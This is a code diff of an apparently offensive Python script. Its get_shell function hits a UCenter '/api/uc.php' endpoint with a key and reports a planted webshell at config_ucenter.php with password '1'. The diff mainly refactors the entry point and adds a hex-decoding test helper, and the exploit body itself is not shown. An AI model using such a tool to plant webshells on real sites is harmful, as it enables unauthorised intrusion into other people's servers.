@@ -1,5 +1,4 @@
 # -*- coding: utf-8 -*-
-
 import os
 from pymongo import MongoClient
 import re
@@ -103,8 +102,28 @@ def get_shell(url,key,host):
     return "webshell:"+host+"/config/config_ucenter.php,password:1"
 
 
-if __name__ == '__main__':
+def execute():
+
     host=sys.argv[1]
     key=sys.argv[2]
     url=host+"/api/uc.php"
     print get_shell(url,key,host)
+
+def test():
+
+    a = open('test.txt', 'r').read().strip()
+    # print a
+    print a.decode('hex')
+
+
+def main():
+
+    test()
+
+
+if __name__ == '__main__':
+
+    os.system('clear')
+
+    main()
+
